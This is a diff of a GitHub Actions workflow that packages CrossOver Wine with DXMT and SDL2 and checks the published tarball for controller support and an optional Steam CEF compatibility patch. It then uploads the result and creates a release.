+          # with zero 32-bit DLLs and a green run.
+          test "${X64}" -gt 0 || { echo "ERROR: no 64-bit DXMT DLLs deployed"; exit 1; }
+          test "${X86}" -gt 0 || {
+            echo "ERROR: no 32-bit DXMT DLLs deployed — check DXMT's install layout"
+            echo "Install tree was:"
+            find "${DXMT_INSTALL}" -name '*.dll' | sort
+            exit 1
+          }
+          echo "Deployed ${X64} x86_64 DLLs, ${X86} i386 DLLs (both layouts)"
+
+          rm -f "${ARTIFACT_NAME}"
+          tar -C "${INJECT_DIR}" -cJf "${ARTIFACT_NAME}" wine
+          ls -lh "${ARTIFACT_NAME}"
+
+      - name: Final artifact check
+        env:
+          CEF: ${{ inputs.steam_cef_hack && '1' || '0' }}
+        run: |
+          echo "=== top-level layout inside ${ARTIFACT_NAME} ==="
+          # List ONCE into a file. `tar -tJf … | grep -q` is a trap here: grep -q
+          # exits on the first match, SIGPIPEs tar (141), and pipefail reports the
+          # pipeline as failed — so on a perfectly good archive the `if` takes the
+          # else branch and kills the run two hours in. It also avoids four extra
+          # full xz decompressions of a ~400 MB archive.
+          LIST="$(mktemp)"
+          tar -tJf "${ARTIFACT_NAME}" > "${LIST}"
+          awk -F/ 'NF>1{print $1"/"$2}' "${LIST}" | sort -u | head -20
+          for d in wine/bin wine/include wine/lib wine/share; do
+            if grep -q "^${d}/" "${LIST}"; then
+              echo "  OK   ${d}"
+            else
+              echo "  FAIL ${d} missing from archive"
+              exit 1
+            fi
+          done
+          rm -f "${LIST}"
+
+          # Re-verify the two things this build exists to fix, on the exact bytes
+          # that get published — not on the staging tree.
+          CHK=$(mktemp -d)
+          tar -xJf "${ARTIFACT_NAME}" -C "${CHK}" \
+            wine/lib/libSDL2-2.0.0.dylib \
+            wine/lib/wine/x86_64-unix/winebus.so \
+            wine/lib/wine/x86_64-windows/kernelbase.dll
+
+          echo "=== SDL2 in the published artifact ==="
+          SDL="${CHK}/wine/lib/libSDL2-2.0.0.dylib"
+          # grep -a straight at the file: no pipeline, so no SIGPIPE/pipefail trap.
+          if grep -a 'sdl2-compat' "$SDL" >/dev/null; then
+            echo "  FAIL the shipped SDL2 is sdl2-compat — no controller at runtime"
+            exit 1
+          fi
+          echo "  OK   $(grep -a -m1 'SDL-release-2' "$SDL" || true) ($(stat -f%z "$SDL") bytes)"
+          # `|| true`: grep -oE exits 1 on no match and pipefail would make an
+          # informational line fail the step.
+          otool -L "$SDL" | grep -oE '(CoreHaptics|GameController|ForceFeedback)' \
+            | sort -u | sed 's/^/  OK   links /' || true
+
+          echo "=== winebus in the published artifact ==="
+          strings -a "${CHK}/wine/lib/wine/x86_64-unix/winebus.so" | grep -w 'libSDL2-2.0.0.dylib' >/dev/null \
+            && echo "  OK   SDL bus compiled in" \
+            || { echo "  FAIL winebus.so has no libSDL2 soname"; exit 1; }
+          # strings, not nm: xbox_bus_init is a local symbol and only survives in
+          # nm output while the .so is unstripped. strings works either way.
+          strings -a "${CHK}/wine/lib/wine/x86_64-unix/winebus.so" | grep -w 'xbox_bus_init' >/dev/null \
+            && echo "  OK   CrossOver's XInput bus (bus_xbox360.c) present" \
+            || { echo "  FAIL xbox_bus_init missing"; exit 1; }
+
+          echo "=== Steam CEF hack (requested: ${CEF}) ==="
+          # UTF-16LE in the PE; drop NULs to make it greppable.
+          if LC_ALL=C tr -d '\000' < "${CHK}/wine/lib/wine/x86_64-windows/kernelbase.dll" \
+               | grep 'steamwebhelper' >/dev/null; then
+            FOUND=1
+          else
+            FOUND=0
+          fi
+          if [ "${CEF}" = "1" ] && [ "${FOUND}" = "0" ]; then
+            echo "  FAIL the hack was requested but is not in the shipped kernelbase.dll"
+            exit 1
+          fi
+          if [ "${CEF}" = "0" ] && [ "${FOUND}" = "1" ]; then
+            # Only a hard error for CX 26.x, where CodeWeavers verifiably dropped
+            # the hack. cx_version is free text now, and an older CX source drop
+            # could legitimately ship it — that must not fail a good build at the
+            # very last step.
+            case "${CX_VERSION}" in
+              26.*)
+                echo "  FAIL the hack was NOT requested but is present — this is not a pure build"
+                exit 1 ;;
+              *)
+                echo "  WARN the hack was NOT requested but is present. CX ${CX_VERSION}"
+                echo "       predates 26.x, where CodeWeavers dropped it, so it most likely"
+                echo "       came with the source drop. Not treating this as an error." ;;
+            esac
+          fi
+          echo "  OK   present=${FOUND}, matches the requested setting"
+          rm -rf "${CHK}"
+
+      - name: Upload build artifact
+        # always(): every check step between the build and here can otherwise
+        # discard a two-hour build with nothing published. A failed verification
+        # should still leave the tarball downloadable for inspection.
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: wine-crossover-${{ inputs.cx_version }}
+          path: ${{ env.ARTIFACT_NAME }}
+          # warn, not error: with always() this step also runs when the build
+          # itself failed and there is legitimately nothing to upload, and a
+          # second red step there would just obscure the real failure. A missing
+          # tarball on a SUCCESSFUL run is already fatal in "Verify Wine artifact".
+          if-no-files-found: warn
+          retention-days: 14
+
+      - name: Create release
+        if: ${{ inputs.make_release }}
+        uses: softprops/action-gh-release@v3
+        with:
+          tag_name: wine-crossover-${{ inputs.cx_version }}${{ inputs.steam_cef_hack && '-steamcef' || '' }}
+          name: CrossOver Wine ${{ inputs.cx_version }}${{ inputs.steam_cef_hack && ' (Steam CEF hack)' || '' }}
+          body: |
+            Wine as shipped by CrossOver ${{ inputs.cx_version }}, built from the
+            CodeWeavers source drop with every CrossOver patch included.
+
+            Steam web-helper CEF patch (CW 13322/17315/21883):
+            **${{ inputs.steam_cef_hack && 'APPLIED' || 'not applied' }}**.
+            That patch appends `--no-sandbox --in-process-gpu --disable-gpu` to
+            `steamwebhelper.exe` and is what stops Steam's login window rendering
+            black. CodeWeavers dropped it before CX26, so it is re-added here.
+
+            Gamepads: real SDL 2.30.12 is bundled (`wine/lib/libSDL2-2.0.0.dylib`),
+            matching CrossOver.app. With **Enable SDL on and Disable Hidraw on**, a
+            DualShock 4 / DualSense over Bluetooth is presented as an XInput pad
+            with working rumble (CW HACK 19629 + CrossOver's `bus_xbox360.c`).
+
+            DXMT (`${{ inputs.dxmt_ref }}`) is bundled:
+            `wine/lib/wine/x86_64-unix/winemetal.so`,
+            `wine/lib/dxmt/{x86_64-windows,i386-windows}/` and
+            `wine/share/dxmt/{x86_64,x86}/`.
+
+            Archive extracts to `wine/{bin,include,lib,share}`.
+          files: ${{ env.ARTIFACT_NAME }}
+          fail_on_unmatched_files: true
